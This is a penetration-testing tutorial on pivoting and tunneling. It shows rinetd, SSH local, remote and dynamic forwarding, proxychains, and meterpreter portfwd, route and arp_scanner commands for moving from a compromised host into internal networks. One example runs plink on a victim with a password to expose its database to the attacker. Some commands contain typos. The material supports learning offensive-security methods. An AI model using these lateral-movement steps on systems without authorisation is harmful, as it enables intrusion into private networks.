# Pivoting - Port forwarding - Tunneling

## Pivoting

Let's say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. The technique of using one compromised machine to access another is called pivoting. Machine one is the `pivot` in the example. The `pivot` is just used as a way to channel/tunnel our attack.

### Ipconfig

We are looking for machines that have at least THREE network interfaces \(loopback, eth0, and eth1 \(or something\)\). These machines are connected to other networks, so we can use them to pivot.

```text
# Windows
ipconfig /all
route print

#Linux
ifconfig
ifconfig -a
```

## Port forwarding and tunneling

### Port forwarding

So imagine that you are on a network and you want to connect to a ftp server \(or any other port\) to upload or download some files. But someone has put some crazy firewall rules \(egress filters\) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server?

What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine.

So instead of having this kind of traffic

```text
attacker/port-21 ----> ftp-server/port-21
```

we will have

```text
attacker:port-80 ----> port-80:>proxy-machine:>port-21 ----> ftp-server
```

And the other way around of course, to receive the traffic.

Okay, so how do we go about actually implementing this?

#### Rinetd - Port forward/redirect

So we can set up this port forwarding machine with the help of rinetd.

Machine 1:    1.1.1.1

Machine 2:    2.2.2.2

Machine 3:    3.3.3.3

To make it clear, we have the following machines: Machine1\(1.1.1.1\) - Behind firewall, and wants to connect to Machine3\(3.3.3.3\). Machine2\(2.2.2.2\) - Forwards incomming connections to the ftp server on Machine3

`$ apt-get install rinetd`

This is the default config file `/etc/rinetd.conf`:

```bash
#
# this is the configuration file for rinetd, the internet redirection server
#
# you may specify global allow and deny rules here
# only ip addresses are matched, hostnames cannot be specified here
# the wildcards you may use are * and ?
#
# allow 192.168.2.*
# deny 192.168.2.1?


#
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress    bindport  connectaddress  connectport


# logging information
logfile /var/log/rinetd.log

# uncomment the following line if you want web-server style logfile format
# logcommon
```

This is the essential part of the configuration file, this is where we create the port-forwarding

```text
# bindadress    bindport  connectaddress  connectport
2.2.2.2          80         3.3.3.3       21
<pivot-ip>    <connect>   <target-ip>    <target port/service>
```

```text
/etc/init.d/rinetd restart
```

So the bind-address is where the proxy receives the connection, and the connect address is the machine it forwards the connection to.

### SSH Tunneling - Port forwarding on SSH

**Use cases**

* You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC.
* You are on a public network and want to encrypt all your http traffic.
* You want to bypass firewall rules.

#### Local port forwarding

Now facebook will be available on address localhost:8080.

```text
ssh -L 8080:www.facebook.com:80 localhost
```

You can also forward ports like this:

```text
ssh username@<remote-machine> -L localport:target-ip:target-port

ssh username@192.168.1.111 -L 5000:192.168.1.222:5000
```

Now this port will be available on your localhost. So you go to:

```text
nc localhost:10000
```

#### Remote port forwarding

Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following:

Here is how you create a remote port forwarding:

```text
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```

By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is **111.111.111.111**.

**Step 1** So on our compromised machine we do:

```text
plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
```

**Step 2** Now we can check netstat on our attacking machine, we should see something like this:

```text
tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt
```

That means what we can connect to that port on the attacking machine from the attacking machine.

**Step 3** Connect using the following command:

```text
mysql -u root -p -h 127.0.0.1 --port=3307
```

#### Dynamic port forwarding

This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding you are only forwarding a single port. But that can be a hassle if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic port forwarding technique.

Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up. Just set up the tunnel like this. After it is set up do not run any commands in that session.

```text
# We connect to the machine we want to pivot from
ssh -D 9050 user@192.168.1.111
```

Since proxychains uses 9050 by defualt \(the default port for tor\) we don't even need to configure proxychains. But if you want to change the port you can do that in `/etc/proxychains.conf`.

```text
proxychains nc 192.168.2.222 21
```

So supress all the logs from proxychains you can configure it in the config file.

**Tunnel all http/https traffic through ssh**

For this we need two machines. Machine1 - 111.111.1111.111 - The server that works as our proxy. Machine2 - The computer with the web browser.

First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works. First you set ssh to:

```text
# On Machine2 we run
ssh -D localhost:9999 root@111.111.111.111

# Can also be run with the -N flag
ssh -D localhost:9999 root@111.111.111.111 -N
```

Now you go to Firefox/settings/advanced/network and **SOCKS** you add **127.0.0.1** and port **9999**

Notice that this setup probably leaks DNS. So don't use it if you need opsec.

To fix the DNS-leak you can go to **about:config** in firefox \(in the addressbar\) then look for **network.proxy.socks\_remote\_dns**, and switch it to **TRUE**. Now you can check: [https://ipleak.net/](https://ipleak.net/)

But we are not done yet. It still says that we have **WebRTC leaks**. In order to solve this you can go to about:config again and set the following to **FALSE**

**media.peerconnection.enabled**

### SShuttle

I haven't used this, but it might work.

```text
sshuttle -r root@192.168.1.101 192.168.1.0/24
```

### Port forward with metasploit

We can also forward ports using metasploit. Say that the compromised machine is running services that are only accessible from within the network, from within that machine. To access that port we can do this in meterpreter:

```text
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.222
```

Now we can access this port on our machine locally like this.

```text
nc 127.0.0.1 3306
```

#### Ping-sweep the network

First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges.

```text
meterpreter > run arp_scanner -r 192.168.1.0/24
```

This command will output all the devices on the netowork.

#### Scan each host

Now that we have a list of all available machines. We want to portscan them.

We will to that portscan through metasploit. Using this module:

```text
use auxiliary/scanner/portscan/tcp
```

If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network.

On the already pwn machine we do

```text
ipconfig
```

Now we add the second network as a new route in metasploit. First we background our session, and then do this:

```text
# the ip addres and the subnet mask, and then the meterpreter session
route add 192.168.1.101 255.255.255.0 1
```

Now we can run our portscanning module:

```text
use auxiliary/scanner/portscan/tcp
```

#### Attack a specific port

In order to attack a specific port we need to forwards it like this

```text
portfwd add -l 3389 -p 3389 -r 192.168.1.222
```

### References

This is a good video-explanation:

[https://www.youtube.com/watch?v=c0XiaNAkjJA](https://www.youtube.com/watch?v=c0XiaNAkjJA)

[https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

{% embed data="{\"url\":\"http://ways2hack.com/how-to-do-pivoting-attack/\",\"type\":\"link\",\"title\":\"How to do Pivoting Attack - Ways To Hack\",\"description\":\"Hello guys in this tutorial you will learn how a attacker use victim as a Pivot to hack deeper into the network. In this scenario you will see that the Attacker does not have direct access to Server 2. So...\",\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://ways2hack.com/wp-content/uploads/2015/09/2.jpg\",\"width\":624,\"height\":333,\"aspectRatio\":0.5336538461538461}}" %}

## SSH Pivoting Continued!

```text
$ ssh -L 9000:imgur.com:80 user@example.com
```

The key here is `-L` which says we’re doing local port forwarding. Then it says we’re forwarding our local port `9000` to [`imgur.com`](http://imgur.com/)`:80`, which is the default port for HTTP. Now open your browser and go to [http://localhost:9000](http://localhost:9000/).

### Connecting to a database behind a firewall

Another good example is if you need to access a port on your server which can only be accessed from `localhost` and not remotely.

An example here is when you need to connect to a database console, which only allows local connection for security reasons. Let’s say you’re running PostgreSQL on your server, which by default listens on the port `5432`.

```text
$ ssh -L 9000:localhost:5432 user@example.com
```

The part that changed here is the `localhost:5432`, which says to forward connections from your local port `9000` to `localhost:5432` on your server. Now we can simply connect to our database.

```text
$ psql -h localhost -p 9000
```

Now let’s stop here for a little bit an explain what is actually going on. In the first example the `9000:imgur.com:80` is actually saying `forward my local port 9000 to` [`imgur.com`](http://imgur.com/) `at port 80`. You can imagine SSH on your server actually making a connection \(a tunnel\) between those two ports, one on your local machine, and one on the target destination.

### Remote port forwarding

Now comes the second part of this tutorial, which is remote port forwarding. This is again best to explain with an example.

Say that you’re developing a Rails application on your local machine, and you’d like to show it to a friend. Unfortunately your ISP didn’t provide you with a public IP address, so it’s not possible to connect to your machine directly via the internet.

Sometimes this can be solved by configuring NAT \(Network Address Translation\) on your router, but this doesn’t always work, and it requires you to change the configuration on your router, which isn’t always desirable. This solution also doesn’t work when you don’t have admin access on your network.

To fix this problem you need to have another computer, which is publicly accessible and have SSH access to it. It can be any server on the internet, as long as you can connect to it. We’ll tell SSH to make a tunnel that opens up a new port on the server, and connects it to a local port on your machine.

```text
$ ssh -R 9000:localhost:3000 user@example.com
```

The syntax here is very similar to local port forwarding, with a single change of `-L` for `-R`. But as with local port forwarding, the syntax remains the same.

First you need to specify the port on which th remote server will listen, which in this case is `9000`, and next follows `localhost` for your local machine, and the local port, which in this case is `3000`.

There is one more thing you need to do to enable this. SSH doesn’t by default allow remote hosts to forwarded ports. The setting needs to be changed in `/etc/ssh/sshd_config`

### A few closing tips

You might have noticed that every time we create a tunnel you also SSH into the server and get a shell. This isn’t usually necessary, as you’re just trying to create a tunnel. To avoid this we can run SSH with the `-nNT` flags, such as the following, which will cause SSH to not allocate a tty and only do the port forwarding.

```text
$ ssh -nNT -L 9000:imgur.com:80 user@example.com
```

 [The Black Magic of SSH / SSH Can Do That?](http://vimeo.com/54505525)

